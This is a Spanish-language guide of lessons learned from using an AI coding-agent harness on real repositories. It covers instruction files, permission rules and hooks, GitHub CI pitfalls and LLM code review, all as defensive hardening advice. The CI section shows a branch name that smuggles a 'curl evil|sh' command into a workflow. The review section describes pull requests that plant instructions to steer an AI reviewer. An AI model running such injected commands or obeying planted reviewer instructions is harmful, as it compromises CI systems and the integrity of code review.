# Lecciones aprendidas

Cosas que salieron mal, o casi, al usar un harness de agente en repositorios reales. Cada entrada es el
síntoma que notarías, la causa y qué hacer. Cuando un documento del proveedor describe el comportamiento,
se enlaza.

## Archivos de instrucciones

### Una rule sin `paths:` se carga en todas las sesiones

**Síntoma.** El contexto se llena y el agente aplica una convención de tests mientras edita una migración.
**Causa.** Un archivo en `.claude/rules/` sin frontmatter `paths:`, o con un YAML que no se puede parsear, se
carga siempre, y nada te avisa.
**Qué hacer.** Haz fallar el CI ante una rule sin `paths:` (el template `instruction-files.yml` lo hace).
Fuente: https://code.claude.com/docs/en/memory#path-specific-rules

### Un `CLAUDE.md` oculta `AGENTS.md` sin avisar

**Síntoma.** Codex u otro agente sigue las convenciones, Claude Code no.
**Causa.** Cuando un repositorio tiene un `CLAUDE.md`, Claude Code lo lee en lugar de `AGENTS.md`. Un
`CLAUDE.md` que dice "lee AGENTS.md" con palabras solo funciona si el modelo decide abrirlo.
**Qué hacer.** Pon `@AGENTS.md` en su propia línea dentro de `CLAUDE.md`. Fuente:
https://code.claude.com/docs/en/memory#agents-md

### Un `CLAUDE.local.md` personal desactiva `AGENTS.md`

**Síntoma.** Después de agregar notas personales, el agente olvida las convenciones del proyecto, solo para ti.
**Causa.** `CLAUDE.local.md` cuenta como un archivo `CLAUDE.md`, así que la carga automática de `AGENTS.md`
se detiene.
**Qué hacer.** Mantén un `CLAUDE.md` que importe `AGENTS.md`; así `CLAUDE.local.md` se suma a él en lugar de
ocultarlo.

### Una instrucción escrita en el chat desaparece tras la compactación

**Síntoma.** A mitad de una sesión larga el agente deja de seguir algo que le indicaste.
**Causa.** Después de `/compact`, solo se vuelve a leer desde disco el `CLAUDE.md` de la raíz del proyecto;
las instrucciones que existen solo en el chat se pierden en el resumen, y los archivos anidados y las rules
se recargan únicamente al leer un archivo que coincida.
**Qué hacer.** Si importa más allá de este mensaje, ponla en un archivo. La segunda vez que escribas la misma
corrección, anótala (la skill `add-rule` ayuda).

### Dos líneas en desacuerdo, y el agente elige una

**Síntoma.** El agente alterna entre dos estilos o dos comandos.
**Causa.** Los archivos de instrucciones se concatenan, no se sobrescriben. Una contradicción entre
`AGENTS.md` y una rule se resuelve de forma arbitraria.
**Qué hacer.** Un solo lugar por instrucción. Ejecuta el check `contradictions` de la skill `audit` después
de editar.

### Un gitignore global excluye el harness

**Síntoma.** Todo funciona en tu máquina; tus compañeros y el CI no ven rules, ni settings, ni skills.
**Causa.** Muchos gitignore globales personales excluyen `.claude/`, así que `git add` omite sin avisar el
`.claude/settings.json`, las rules y las skills del proyecto.
**Qué hacer.** Agrega `!.claude/` (o las rutas exactas) al `.gitignore` del repositorio, mantén ignorado
`.claude/settings.local.json` y verifica con `git check-ignore -v .claude/settings.json`.

### La identidad del commit no es la de `git config`

**Síntoma.** Los commits de un repositorio pensado para ser anónimo o público llevan tu nombre y correo
personales.
**Causa.** Las variables de entorno `GIT_AUTHOR_*` y `GIT_COMMITTER_*` tienen prioridad sobre `user.name` y
`user.email` de cualquier archivo de configuración.
**Qué hacer.** Revisa `git log --format='%an <%ae>'` antes del primer push de un repositorio nuevo, y busca
datos personales en todo el historial, no solo en los archivos.

## Permisos y hooks

### Una regla de permisos de Bash es fácil de eludir

**Síntoma.** Una regla `ask` sobre `git push` nunca pregunta, y aun así se hacen pushes.
**Causa.** Las reglas de Bash comparan el texto del comando por prefijo con comodines. `Bash(git push *)` no
coincide con `git -C . push origin main`.
**Qué hacer.** Usa las reglas por comodidad y como primera línea; aplica lo que nunca debe ocurrir en un
hook `PreToolUse` que analice el comando, y en el CI. Fuente: https://code.claude.com/docs/en/permissions

### Bloquear en `PostToolUse` no bloquea nada

**Síntoma.** El hook se ejecuta, imprime un error, y el archivo igual cambió.
**Causa.** `PostToolUse` se ejecuta después de la herramienta; la acción ya ocurrió.
**Qué hacer.** Bloquea en `PreToolUse` con código de salida 2. Usa `PostToolUse` para verificar o formatear.
Fuente: https://code.claude.com/docs/en/hooks

### Un hook que falla deja pasar la acción

**Síntoma.** Un hook de protección "funciona" hasta que llega una máquina sin `jq`.
**Causa.** El código de salida 2 bloquea; cualquier otro fallo es un error que no bloquea y la acción sigue
adelante.
**Qué hacer.** Prueba cada hook enviándole JSON de ejemplo por pipe, incluidos los casos que deben pasar.

## CI

### Un check que no puede fallar no es un check

**Síntoma.** Todo está en verde, y lo que el check protege está roto.
**Causa.** `continue-on-error: true`, un `if:` que omite el job, o un paso que ignora su código de salida.
**Qué hacer.** Revisa el workflow, no el badge. Trata cualquier condición de omisión en un check obligatorio
como un hallazgo.

### Un check obligatorio con filtro de rutas bloquea pull requests no relacionados

**Síntoma.** Un pull request que no toca las rutas filtradas espera indefinidamente en "Pending".
**Causa.** Un workflow omitido por un filtro `paths:` nunca reporta, y un check obligatorio que nunca
reporta bloquea el merge.
**Qué hacer.** No filtres por ruta los workflows cuyos checks son obligatorios; haz el job barato en su
lugar. Fuente:
https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/skipping-workflow-runs

### El marcador de omisión en el cuerpo de un squash desactiva main

**Síntoma.** Después de un merge, no se ejecutó CI, release ni deploy en `main`.
**Causa.** GitHub omite los workflows de `push` y `pull_request` cuando el mensaje del commit contiene el
marcador de omisión (las palabras "skip ci" entre corchetes), y el cuerpo cuenta. Un pull request sobre el
proceso de release tiende a citarlo.
**Qué hacer.** Nunca escribas el marcador de forma literal en el cuerpo de un pull request ni en un mensaje
de squash; descríbelo con palabras. Ejecuta un watchdog programado que verifique que cada merge en `main`
recibió sus ejecuciones posteriores al merge.

### Un pull request con conflicto no ejecuta los workflows de `pull_request`

**Síntoma.** En un pull request aparecen solo uno o dos checks; el resto faltan, no fallaron.
**Causa.** Los workflows de `pull_request` se ejecutan sobre el merge ref, que GitHub no puede construir
mientras la rama tiene conflictos. Los workflows de `pull_request_target` sí se ejecutan. Filtrar los checks
por "no exitosos" no devuelve nada y se lee como verde.
**Qué hacer.** Cuando falten checks, revisa primero el estado de mergeabilidad, y cuenta los checks, no los
fallos.

### Un workflow nuevo no se ejecuta en pull requests antiguos

**Síntoma.** Hiciste merge de un workflow `pull_request` nuevo y los pull requests abiertos no lo ejecutan.
**Causa.** Los workflows de `pull_request` se leen desde la rama head del pull request.
**Qué hacer.** Prueba un workflow nuevo con un pull request recién creado sobre el `main` actual, o
actualiza la rama antigua.

### Dos pull requests en verde rompen `main` juntos

**Síntoma.** Cada pull request pasó; después de hacer merge de ambos, `main` tiene dos heads de migración o
un lockfile roto.
**Causa.** Cada uno se probó contra `main`, no contra el otro.
**Qué hacer.** Exige que las ramas estén actualizadas antes del merge, o usa una merge queue.

### Los tags cambian de destino

**Síntoma.** Un workflow que no cambió empieza a comportarse de otra forma, o peor.
**Causa.** `uses: owner/action@v1` sigue a lo que el tag apunte hoy.
**Qué hacer.** Fija cada action de terceros por SHA de commit con la versión en un comentario, y deja que
Dependabot las actualice. Lee el `action.yml` de la versión fijada antes de usar un input.

### El texto no confiable dentro de `run:` es código

**Síntoma.** Ninguno, hasta que una rama llamada `x";curl evil|sh;"` se ejecuta en tu CI.
**Causa.** `${{ github.head_ref }}` o un título dentro de `run:` se pega en el shell antes de ejecutarse.
**Qué hacer.** Pasa esos valores mediante `env:` y entrecomilla la variable. Fuente:
https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions

## Revisión con LLM

### El modelo reporta problemas que no existen

**Síntoma.** Un hallazgo con aparente seguridad cita una línea que no existe o dice algo que el archivo no
dice.
**Causa.** Los modelos resumen; un resumen puede ser incorrecto.
**Qué hacer.** Exige una cita textual por hallazgo y descarta los hallazgos bloqueantes cuya cita no esté en
el archivo.

### El pull request puede darle instrucciones al reviewer

**Síntoma.** Una revisión aprueba algo que no debería, o sigue una instrucción oculta en un comentario.
**Causa.** Todo lo que hay en el pull request está controlado por el autor, incluido un `CLAUDE.md` que
agregue, que un agente ejecutado sobre ese árbol carga como instrucciones.
**Qué hacer.** Elimina del árbol revisado la configuración de agentes y los symlinks, toma el prompt y las
convenciones de la rama base, y trata como un hallazgo cualquier texto que intente dirigir al reviewer.

### Activar un check de IA bloqueante desde el primer día

**Síntoma.** El equipo aprende a ignorar el check, o a eludirlo.
**Causa.** La precisión se desconoce hasta que se mide, y los falsos positivos iniciales cuestan confianza.
**Qué hacer.** Ejecútalo primero en modo shadow (check neutral, texto real), mide, ajusta, y luego cambia a
bloqueante.

## Trabajar con un agente

### La mayoría de los hallazgos de una revisión son regresiones de los fixes del mismo pull request

**Síntoma.** Ronda tras ronda de revisión, cada ronda con hallazgos nuevos.
**Causa.** Un fix rompe algo cercano; los checks se ejecutan una sola vez al final, así que nadie ve qué fix
rompió qué.
**Qué hacer.** Verifica después de cada fix. Antes de hacer push, vuelve a leer los puntos de llamada y los
elementos hermanos de todo lo que tocaste. Agrupa los hallazgos relacionados en un solo commit y apunta a dos
rondas.

### Un reporte es una afirmación, no una prueba

**Síntoma.** Una decisión basada en el resumen de un agente resulta ser incorrecta.
**Causa.** El reporte de un subagent, un mensaje de commit o un badge en verde están comprimidos; la
evidencia no sobrevivió al resumen.
**Qué hacer.** Antes de actuar sobre una afirmación que sostiene la decisión, abre la fuente que cita.
